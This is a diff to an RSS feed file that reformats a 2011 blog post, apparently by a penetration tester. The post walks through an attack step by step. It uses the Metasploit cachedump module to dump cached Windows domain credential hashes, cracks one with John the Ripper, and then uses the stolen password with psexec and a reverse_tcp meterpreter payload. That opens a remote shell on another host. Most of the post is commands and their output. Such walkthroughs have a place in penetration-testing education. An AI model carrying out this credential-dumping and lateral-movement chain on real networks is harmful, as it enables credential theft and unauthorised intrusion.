@@ -8,7 +8,7 @@
     <language>en-us</language>
     <lastBuildDate>Mon, 14 Feb 2011 22:03:37 +0000</lastBuildDate>
     
-	<atom:link href="https://malicious.link/categories/cachedump/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://malicious.link/categories/cachedump/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
@@ -17,12 +17,125 @@
       <pubDate>Mon, 14 Feb 2011 22:03:37 +0000</pubDate>
       
       <guid>https://malicious.link/post/2011/2011-02-14-cachedump-for-meterpreter-in-action/</guid>
-      <description>Update: Cachedump has been added to the Metasploit trunk:
-https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946
-Pull it down:
-wget http://lab.mediaservice.net/code/cachedump.rb  put it here: /(metasploitdir)/modules/post/windows/gather
-Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):
-meterpreter &amp;gt; run post/windows/gather/cachedump [*] Executing module against WORKSTATION244 [*] Obtaining the boot key... [*] Trying &#39;XP&#39; style... [*] Getting PolSecretEncryptionKey... [*] XP compatible client [*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c [*] Getting LK$KM... [*] Dumping cached credentials... Username : jdoe Hash : 592cdfbc3f1ef77ae95c75f851e37166 Last login : 2010-05-11 01:43:48 DNS Domain Name : CONTOSO.</description>
+      <description>&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: Cachedump has been added to the Metasploit trunk:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946&#34;&gt;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Pull it down:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;wget http://lab.mediaservice.net/code/cachedump.rb
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;put it here:  &lt;code&gt;/(metasploitdir)/modules/post/windows/gather&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/gather/cachedump
+[*] Executing module against WORKSTATION244
+[*] Obtaining the boot key...
+[*] Trying &#39;XP&#39; style...
+[*] Getting PolSecretEncryptionKey...
+[*] XP compatible client
+[*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c
+[*] Getting LK$KM...
+[*] Dumping cached credentials...
+Username  : jdoe
+Hash  : 592cdfbc3f1ef77ae95c75f851e37166
+Last login  : 2010-05-11 01:43:48
+DNS Domain Name  : CONTOSO.CO
+Effective Name  : jdo
+Full Name  : eJane Do
+User ID  : 1107
+Primary Group ID  : 513
+Additional groups  : 33620069 33554432 34013184
+Logon domain name  : CONTOS
+----------------------------------------------------------------------
+ 
+[*] John the Ripper format:
+jdoe:592cdfbc3f1ef77ae95c75f851e37166:CONTOSO.CO:CONTOS
+
+[*] Hash are in MSCACHE format. (mscash)
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Crack it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cat lab.dic | ./john --stdin lab.mscash --format=mscash --pot=lab.pot  
+Loaded 1 password hash (M$ Cache Hash [Generic 1x])  
+ASDqwe123  (jdoe)  
+guesses: 1  time: 0:00:00:00  c/s: 500  trying: ASDqwe123
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Use it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; background  
+msf exploit(handler) &amp;gt; route add 10.10.10.0 255.255.255.0 1  
+msf exploit(handler) &amp;gt; use exploit/windows/smb/psexec  
+msf exploit(psexec) &amp;gt; set PAYLOAD windows/meterpreter/reverse_tcp  
+PAYLOAD =&amp;gt; windows/meterpreter/reverse_tcp  
+msf exploit(psexec) &amp;gt; set LHOST X.X.X.X  
+LHOST =&amp;gt; X.X.X.X  
+msf exploit(psexec) &amp;gt; set LPORT 80  
+LPORT =&amp;gt; 80  
+msf exploit(psexec) &amp;gt; set SMBDomain Contoso
+SMBDomain =&amp;gt; Contoso  
+msf exploit(psexec) &amp;gt; set SMBUser jdoe  
+SMBUser =&amp;gt; jdoe  
+msf exploit(psexec) &amp;gt; set SMBPass ASDqwe123  
+SMBPass =&amp;gt; ASDqwe123  
+msf exploit(psexec) &amp;gt; show options
+
+Module options (exploit/windows/smb/psexec):
+
+Name  Current Setting  Required  Description  
+----  ---------------  --------  -----------  
+RHOST  yes  The target address  
+RPORT  445  yes  Set the SMB service port  
+SMBDomain  Contoso  no  The Windows domain to use for authentication  
+SMBPass  ASDqwe123  no  The password for the specified username  
+SMBUser  jdoe  no  The username to authenticate as
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+
+Name  Current Setting  Required  Description  
+----  ---------------  --------  -----------  
+EXITFUNC  process  yes  Exit technique: seh, thread, none, process  
+LHOST  X.X.X.X  yes  The listen address  
+LPORT  80  yes  The listen port
+
+
+Exploit target:
+
+Id  Name  
+--  ----  
+0  Automatic
+
+ 
+msf exploit(psexec) &amp;gt; set RHOST 10.10.10.200  
+RHOST =&amp;gt; 10.10.10.200  
+msf exploit(psexec) &amp;gt; exploit
+
+[*] Started reverse handler on X.X.X.X:80  
+[*] Connecting to the server...  
+[*] Authenticating to 10.10.10.200:445|Contoso as user &#39;jdoe&#39;...  
+[*] Uploading payload...  
+[*] Created jSlxARUj.exe...  
+[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[svcctl] ...  
+[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[svcctl] ...  
+[*] Obtaining a service manager handle...  
+[*] Creating a new service (SyHtwKpn - &amp;quot;MbEXNupOpYUL&amp;quot;)...  
+[*] Closing service handle...  
+[*] Opening service...  
+[*] Starting the service...  
+[*] Removing the service...  
+[*] Closing service handle...  
+[*] Deleting jSlxARUj.exe...  
+[*] Meterpreter session 2 opened (X.X.X.X:80 -&amp;gt; X.X.X.X:54430) at Mon Feb 14 22:23:00 +0000 2011
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Woot ;-)&lt;/p&gt;
+</description>
     </item>
     
   </channel>
